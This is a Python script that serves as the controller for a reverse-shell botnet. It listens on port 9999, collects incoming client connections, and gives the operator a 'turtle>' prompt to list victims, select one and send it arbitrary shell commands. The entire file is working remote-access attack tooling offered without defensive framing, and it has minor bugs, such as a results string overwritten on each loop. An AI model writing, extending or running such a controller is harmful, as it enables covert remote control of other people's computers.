import socket
import sys
import threading
import time
from queue import Queue

number_of_threads = 2  # as we want to do two task at same time so we are making it  2
job_number = [1, 2]  # job of first thread is to basically listen for connection and accept connection , job of second thread is to sends commands as handle connection
queue = Queue()
all_connections = []
all_address = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as mssg:
        print(mssg)


def bind_socket():
    try:
        global host
        global port
        global s

        s.bind((host, port))
        s.listen(5)
    except socket.error as mssg:
        print(f"here is your mssg : \n {mssg}")
        bind_socket()


# handling connection from multiple clients and saving to our list
# closing previous connections  when server.py file restarted
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # blocks the timeout to close the server itself bcz of no activity

            all_connections.append(conn)
            all_address.append(address)

            print("connection has been stablished :" + address[0])

        except:
            print("error accepting connections")
# second thread function  selects and connects to the specific client
# interactive prompt for sending commands
def start_turtle():

    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
            else:
                print("command not recognized")


# display all current active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i)+"  "+ str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

    print("active clients are" + '\n' + results)


# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select','')
        target = int(target)
        conn = all_connections[target]
        print("connection has been established")
        print(str(all_address[target][0])+"> ", end='')
        return conn
    except:
        print("selecions are valid")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("error sending commands")


#create worker threads
def create_workers():
    for _ in range(number_of_threads):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in job_number:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()